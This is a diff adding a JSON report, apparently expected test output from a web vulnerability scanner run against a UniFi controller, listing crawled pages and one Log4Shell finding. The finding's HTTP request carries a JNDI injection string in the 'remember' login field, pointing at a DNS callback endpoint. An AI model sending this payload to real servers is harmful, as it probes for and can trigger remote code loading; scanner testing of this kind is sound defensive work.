@@ -1,0 +1,145 @@
+{
+    "vulnerabilities": {
+        "Log4Shell": [
+            {
+                "method": "POST",
+                "path": "/api/login",
+                "info": "URL https://unifi:8443/api/login seems vulnerable to Log4Shell attack by using the body parameter remember",
+                "level": 4,
+                "http_request": "POST /api/login HTTP/1.1\nhost: unifi:8443\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncontent-type: application/json\ncontent-length: 142\nContent-Type: application/json\n\n{\"username\": \"alice\", \"password\": \"Letm3in_\", \"remember\": \"${jndi:dns://dns-endpoint/c9cda4a8-94a8-457c-93fb-422465926b68.l}\", \"strict\": true}",
+                "wstg": [
+                    "WSTG-INPV-11"
+                ],
+                "detail": {
+                    "response": {
+                        "status_code": 400,
+                        "body": "{\"meta\":{\"rc\":\"error\",\"msg\":\"api.err.InvalidPayload\"},\"data\":[]}"
+                    }
+                }
+            }
+        ]
+    },
+    "infos": {
+        "target": "https://unifi:8443/",
+        "crawled_pages_nbr": 13,
+        "crawled_pages": [
+            {
+                "request": {
+                    "url": "https://unifi:8443/",
+                    "method": "GET"
+                },
+                "response": {
+                    "status_code": 302
+                }
+            },
+            {
+                "request": {
+                    "url": "https://unifi:8443/manage",
+                    "method": "GET"
+                },
+                "response": {
+                    "status_code": 302
+                }
+            },
+            {
+                "request": {
+                    "url": "https://unifi:8443/manage/",
+                    "method": "GET"
+                },
+                "response": {
+                    "status_code": 302
+                }
+            },
+            {
+                "request": {
+                    "url": "https://unifi:8443/manage/account/login",
+                    "method": "GET"
+                },
+                "response": {
+                    "status_code": 200
+                }
+            },
+            {
+                "request": {
+                    "url": "https://unifi:8443/manage/account/login",
+                    "method": "GET"
+                },
+                "response": {
+                    "status_code": 200
+                }
+            },
+            {
+                "request": {
+                    "url": "https://unifi:8443/manage/account/login",
+                    "method": "GET"
+                },
+                "response": {
+                    "status_code": 200
+                }
+            },
+            {
+                "request": {
+                    "url": "https://unifi:8443/manage/angular/g2e6f199fa/images/favicons/favicon-120.png",
+                    "method": "GET"
+                },
+                "response": {
+                    "status_code": 200
+                }
+            },
+            {
+                "request": {
+                    "url": "https://unifi:8443/manage/angular/g2e6f199fa/images/favicons/favicon-144.png",
+                    "method": "GET"
+                },
+                "response": {
+                    "status_code": 200
+                }
+            },
+            {
+                "request": {
+                    "url": "https://unifi:8443/manage/angular/g2e6f199fa/images/favicons/favicon-152.png",
+                    "method": "GET"
+                },
+                "response": {
+                    "status_code": 200
+                }
+            },
+            {
+                "request": {
+                    "url": "https://unifi:8443/manage/angular/g2e6f199fa/images/favicons/favicon-32.png",
+                    "method": "GET"
+                },
+                "response": {
+                    "status_code": 200
+                }
+            },
+            {
+                "request": {
+                    "url": "https://unifi:8443/manage/angular/g2e6f199fa/images/favicons/favicon-57.png",
+                    "method": "GET"
+                },
+                "response": {
+                    "status_code": 200
+                }
+            },
+            {
+                "request": {
+                    "url": "https://unifi:8443/manage/angular/g2e6f199fa/images/favicons/favicon-72.png",
+                    "method": "GET"
+                },
+                "response": {
+                    "status_code": 200
+                }
+            },
+            {
+                "request": {
+                    "url": "https://unifi:8443/manage/angular/g2e6f199fa/js/index.js",
+                    "method": "GET"
+                },
+                "response": {
+                    "status_code": 200
+                }
+            }
+        ]
+    }
+}
